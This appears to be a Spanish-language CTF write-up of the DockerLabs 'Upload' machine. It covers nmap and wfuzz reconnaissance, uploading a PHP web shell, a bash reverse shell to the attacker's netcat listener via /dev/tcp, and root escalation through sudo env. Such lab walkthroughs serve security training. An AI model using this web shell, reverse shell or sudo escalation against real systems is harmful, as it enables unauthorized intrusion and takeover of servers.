![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-banner.png)

[Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos con un escaneo de nmap a todos los puertos de la maquina vulnerable en busca de puertos abiertos.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.2 -oG allPorts
________________________________________________________________

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

El puerto 80 corresponde a un servicio http(Hyper Text Transfer Protocol) o servicio web en pocas palabras.

Ahora hacemos un escaneo sobre este con un conjunto de scripts basicos de reconocimiento que trae por defecto nmap.

```shell
nmap -p80 -sCV 172.17.0.2 -oN targeted
______________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
Guiandonos por el escaneo podemos ver que dentro del puerto 80 se aloja una pagina web que, tal parece, nos dejara subir archivos al servidor.

Visualizamos la pagina web.

![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-img1.png)

Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo php con el que podamos ejecutar comandos dentro de la maquina atraves de un paramentro. Y es justo lo que haremos.
```shell
echo "<?php system(\$_GET['cmd']); ?>" >> test.php
```

Despues de crear el archivo lo subiremos al servidor.

Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo. Para ello, haremos uso de wfuzz para encontrar esa ruta en donde fue guardado nuestro archivo.

```shell
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://172.17.0.2/FUZZ
________________________________________________________________________________________________________________
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/FUZZ
Total requests: 1273832

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        53 L     104 W      1361 Ch     "# directory-list-2.3-big.txt"
...
000000164:   301        9 L      28 W       310 Ch      "uploads"
```

Si revisamos el directorio que nos ha econtrado wfuzz llamado "uploads", podremos oberservar que ahi se encuntra alojado nuestro archivo test.php.

![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img2.png)

Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un llamado al parametro que predefinimos anteriormente para que ejecute el comando "id" en la maquina.

```
http://172.17.0.2/uploads/test.php?cmd=id
```

![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img3.png)
Al hacer esto podremos observar la respuesta del servidor ante el comando "id" por lo que el archivo funciona y el servidor interpreta de forma correcta las peticiones hechas atraves del archivo php. Sabiendo esto, podemos intentar entablar una revershell del servidor a nuestra maquina atacante. 

## Explotacion

Nos colocamos en escucha con netcat por el puerto 443.
```shell
nc -nlvp 443
```
Y hacemos la siguiente peticion cambiando el "&" por su expresion en URL, un %26, para que pueda ser interpretado por el servidor:
```shell
http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```
![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img4.png)
Y hemos logrado ganar acceso como el usuario www-data.

## Escalada de privilegios

Comenzamos ejecuntadno un "sudo -l" para ver si exiten algun comando que podamos ejecutar con altos privilegios.

```shell
sudo -l
________________________
...
User www-data may run the following commands on 41e845320485:
    (root) NOPASSWD: /usr/bin/env
```
Vemos que podemos ejecutar el comando "env" como usuario root. Por ende, ejecutamos una bash atraves del comando env con ayuda de un sudo.
```shell
sudo env /bin/bash
```

![image](https://github.com/Crisstianpd/CTFs/blob/f45ffec0d097da4e06089b4f4224cc077d4140cd/DockerLabs/Easy/Upload/imgs/upload-img5.png)
Y comprobamos finalmente atraves de un whoami he id que ya nos econtramos como usuario root.

Y de esta forma hemos resuelto la maquina Upload de DockerLabs.






